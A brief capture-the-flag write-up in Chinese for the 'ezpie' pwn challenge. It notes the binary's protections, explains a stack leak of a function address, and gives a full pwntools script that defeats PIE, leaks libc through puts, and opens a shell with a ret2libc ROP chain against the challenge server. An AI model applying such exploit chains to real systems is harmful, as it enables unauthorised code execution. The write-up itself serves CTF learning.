# ezpie

## 文件分析

NX on, PIE on, Canary off, RELRO full  
ghidra分析为64位程序

## 逆向

栈上放上了func函数的地址，只要把buf填满就可以读到func的地址，
然后就打ret2libc就行

## EXPLOIT

```python
from pwn import *
import LibcSearcher

def payload(lo):
    global sh
    if lo:
        sh = process('ezpie')
    else:
        sh = remote('43.249.195.138', 22188)
    if lo & 0b10:
        gdb.attach(sh)
    elf = ELF('ezpie')

    # payload 1, fill buf to read funcAddr
    sh.sendline(b'0'*35 + b'FLAG')

    sh.recvuntil(b'FLAG\n') # skip
    funcAddr = u64(sh.recv(6) + b'\0\0')
    pieBase = funcAddr - elf.symbols['func']
    putsPlt = pieBase + elf.plt['puts']
    putsGot = pieBase + elf.got['puts']
    retAddr = pieBase + 0x1253
    popRdiAddr = pieBase + 0x1333

    # payload 2, leak libcBase
    sh.sendline(b'0'*88 + p64(popRdiAddr) + p64(putsGot) + p64(putsPlt) + p64(funcAddr))

    sh.recvuntil(b'you\n') # skip
    putsLibc = u64(sh.recv(6) + b'\0\0')
    libc = LibcSearcher.LibcSearcher('puts', putsLibc & 0xfff)
    libcBase = putsLibc - libc.dump('puts')
    systemAddr = libcBase + libc.dump('system')
    shstrAddr = libcBase + libc.dump('str_bin_sh')

    # payload 3, execute system
    sh.sendline(b'0'*88 + p64(popRdiAddr) + p64(shstrAddr) + p64(retAddr) + p64(systemAddr))

    sh.interactive()
```

Done.
